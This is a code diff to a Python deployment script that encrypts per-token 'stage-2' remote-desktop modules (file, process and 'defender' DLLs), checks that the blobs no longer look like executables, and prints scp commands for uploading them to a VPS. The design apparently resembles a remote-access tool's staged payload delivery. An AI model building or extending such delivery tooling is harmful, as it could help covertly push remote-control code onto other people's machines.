@@ -1,22 +1,33 @@
 #!/usr/bin/env python3
 """
-_deploy_stage2.py — encrypt stage-2 modules for a given room_token and
+_deploy_stage2.py — encrypt stage-2 modules for ONE OR MORE room_tokens and
 stage them under deploy/stage2/<token>/ ready to upload to the VPS.
 
 Usage:
-    python _deploy_stage2.py <room_token>
+    python _deploy_stage2.py <token1> [<token2> ...]
+    python _deploy_stage2.py --from-file tokens.txt
     python _deploy_stage2.py --from-config build/bin/host_config.json
+
+Examples:
+    # single token
+    python _deploy_stage2.py ABC123
+
+    # several tokens in one shot (all get the same module set)
+    python _deploy_stage2.py ABC123 XYZ789 LMN456
+
+    # from a file — one token per line, # comments allowed
+    python _deploy_stage2.py --from-file tokens.txt
 
 The output tree matches what server.py serves from STAGE2_DIR:
 
-    deploy/stage2/<room_token>/filemgr.bin
-    deploy/stage2/<room_token>/procmgr.bin
-    deploy/stage2/<room_token>/defender.bin
-    deploy/stage2/<room_token>/README.txt
+    deploy/stage2/<token1>/filemgr.bin
+    deploy/stage2/<token1>/procmgr.bin
+    deploy/stage2/<token1>/defender.bin
+    deploy/stage2/<token2>/filemgr.bin
+    ...
 
-To deploy to your VPS:
-    scp -r deploy/stage2/<room_token> root@<vps>:/opt/remotedesk/stage2/
-    sudo systemctl restart rdp-server    # or whatever runs server.py
+To deploy to your VPS (one rsync/scp does all tokens at once):
+    scp -r deploy/stage2 root@<vps>:/opt/remotedesk/
 """
 import argparse
 import hashlib
@@ -37,38 +48,37 @@ GEN_SCRIPT = HERE / "_gen_stage2_blob.py"
 MODULES = ["filemgr", "procmgr", "defender"]
 
 
-def load_token_from_config(path: Path) -> str:
+def load_token_from_config(path: Path) -> list[str]:
     if not path.is_file():
         sys.exit(f"ERROR: config file not found: {path}")
     data = json.loads(path.read_text(encoding="utf-8-sig"))
     token = str(data.get("room_token", "")).strip()
     if not token:
         sys.exit(f"ERROR: room_token empty in {path}")
-    return token
+    return [token]
 
 
-def main() -> int:
-    p = argparse.ArgumentParser()
-    g = p.add_mutually_exclusive_group(required=True)
-    g.add_argument("room_token", nargs="?",
-                   help="Room token (must match what the host uses).")
-    g.add_argument("--from-config",
-                   help="Path to host_config.json that contains room_token.")
-    args = p.parse_args()
+def load_tokens_from_file(path: Path) -> list[str]:
+    if not path.is_file():
+        sys.exit(f"ERROR: tokens file not found: {path}")
+    tokens = []
+    for raw in path.read_text(encoding="utf-8-sig").splitlines():
+        line = raw.strip()
+        if not line or line.startswith("#"):
+            continue
+        tokens.append(line)
+    if not tokens:
+        sys.exit(f"ERROR: no tokens found in {path} (one per line, # for comments)")
+    return tokens
 
-    token = args.room_token or load_token_from_config(Path(args.from_config))
-    print(f"Deploying stage-2 modules for token: {token[:8]}...{token[-4:]}  (len={len(token)})")
 
-    if not BUILD_STAGE2_DIR.is_dir():
-        sys.exit(f"ERROR: {BUILD_STAGE2_DIR} does not exist — run the build first "
-                 f"(cmake --build build).")
-
+def bundle_one_token(token: str) -> tuple[Path, list]:
+    """Encrypt all modules for a single token. Returns (out_dir, [(mod, size, sha)])."""
     out_dir = DEPLOY_ROOT / token
     if out_dir.exists():
         shutil.rmtree(out_dir)
     out_dir.mkdir(parents=True, exist_ok=True)
 
-    # Encrypt each module DLL
     encrypted = []
     for mod in MODULES:
         dll = BUILD_STAGE2_DIR / f"{mod}.dll"
@@ -80,37 +90,88 @@ def main() -> int:
             sys.executable, str(GEN_SCRIPT), token, str(dll), str(bin_out)
         ])
         if rc != 0:
-            sys.exit(f"ERROR: encryption failed for {mod}")
-        # quick sanity check: entropy should be near max
+            sys.exit(f"ERROR: encryption failed for {mod} / token {token[:8]}...")
         data = bin_out.read_bytes()
         if len(data) < 100 or data[:2] == b"MZ":
             sys.exit(f"ERROR: {bin_out} looks wrong (first 2 bytes or size)")
         sha = hashlib.sha256(data).hexdigest()[:12]
         encrypted.append((mod, len(data), sha))
 
-    # README for human verification (NOT shipped to VPS)
+    # Per-token README
     readme = out_dir / "README.txt"
     with readme.open("w", encoding="utf-8") as f:
         f.write(f"Stage-2 deployment bundle\n")
-        f.write(f"Room token (first/last 8 shown): {token[:8]}...{token[-8:]}\n")
-        f.write(f"Generated: {os.path.basename(str(HERE))} @ {os.environ.get('COMPUTERNAME','')}\n\n")
+        if len(token) >= 16:
+            f.write(f"Room token (first/last 8): {token[:8]}...{token[-8:]}\n")
+        else:
+            f.write(f"Room token: {token}  (len={len(token)})\n")
+        f.write(f"Generated: {os.path.basename(str(HERE))} @ "
+                f"{os.environ.get('COMPUTERNAME','')}\n\n")
         f.write(f"Modules:\n")
         for mod, sz, sha in encrypted:
             f.write(f"  {mod}.bin  {sz:>10,} bytes  sha256[0:12]={sha}\n")
-        f.write(f"\nUpload:\n")
-        f.write(f"    scp {out_dir.name}/*.bin root@<vps>:/opt/remotedesk/stage2/{token}/\n")
-        f.write(f"\nOr tar-pipe it:\n")
-        f.write(f"    tar -cf - -C {out_dir} . | ssh root@<vps> "
-                f"'cd /opt/remotedesk/stage2 && mkdir -p {token} && tar -xf - -C {token}'\n")
-        f.write(f"\nAfter upload, restart the server so it picks up new blobs.\n")
+    return out_dir, encrypted
+
+
+def main() -> int:
+    p = argparse.ArgumentParser(
+        description="Encrypt stage-2 modules for one or more room tokens."
+    )
+    p.add_argument("tokens", nargs="*",
+                   help="One or more room tokens (space-separated).")
+    p.add_argument("--from-file",
+                   help="Read tokens from a file, one per line (# = comment).")
+    p.add_argument("--from-config",
+                   help="Read the token from a host_config.json file.")
+    args = p.parse_args()
+
+    # Collect tokens from every provided source. De-duplicate while preserving order.
+    tokens: list[str] = []
+    seen: set[str] = set()
+    for t in args.tokens:
+        if t and t not in seen:
+            tokens.append(t); seen.add(t)
+    if args.from_file:
+        for t in load_tokens_from_file(Path(args.from_file)):
+            if t not in seen:
+                tokens.append(t); seen.add(t)
+    if args.from_config:
+        for t in load_token_from_config(Path(args.from_config)):
+            if t not in seen:
+                tokens.append(t); seen.add(t)
+
+    if not tokens:
+        p.error("no tokens given (pass positional args, --from-file, or --from-config)")
+
+    if not BUILD_STAGE2_DIR.is_dir():
+        sys.exit(f"ERROR: {BUILD_STAGE2_DIR} does not exist — run the build first "
+                 f"(cmake --build build).")
+
+    print(f"Generating stage-2 bundles for {len(tokens)} token(s)...")
+
+    results: list[tuple[str, Path, list]] = []
+    for token in tokens:
+        tag = token[:8] + ("..." + token[-4:] if len(token) > 12 else "")
+        print(f"\n--- token: {tag}  (len={len(token)}) ---")
+        out_dir, enc = bundle_one_token(token)
+        results.append((token, out_dir, enc))
 
     # Summary
-    print(f"\n=== Deployment bundle ready: {out_dir} ===")
-    for mod, sz, sha in encrypted:
-        print(f"  {mod}.bin  {sz:>10,} bytes  sha256[0:12]={sha}")
-    print(f"\nUpload with:")
-    print(f"  scp -r {out_dir} root@<vps>:/opt/remotedesk/stage2/")
-    print(f"\nSee {readme} for details.")
+    print("\n" + "=" * 64)
+    print("Deployment bundle ready:", DEPLOY_ROOT)
+    print("=" * 64)
+    for token, out_dir, enc in results:
+        tag = token[:8] + ("..." + token[-4:] if len(token) > 12 else "")
+        print(f"\n  {tag}/")
+        for mod, sz, sha in enc:
+            print(f"    {mod}.bin  {sz:>10,} bytes  sha256[0:12]={sha}")
+
+    # Single upload line covers ALL tokens because they share DEPLOY_ROOT
+    print(f"\nUpload ALL tokens in one shot:")
+    print(f"  scp -r {DEPLOY_ROOT} root@<vps>:/opt/remotedesk/")
+    print(f"\nOr via deploy_to_vps.ps1:")
+    print(f"  .\\deploy_to_vps.ps1 -Vps root@<vps> -SkipBuild -SkipBlobs")
+    print(f"  (blobs already generated — deploy script will pick them up from deploy/)")
     return 0
 
 
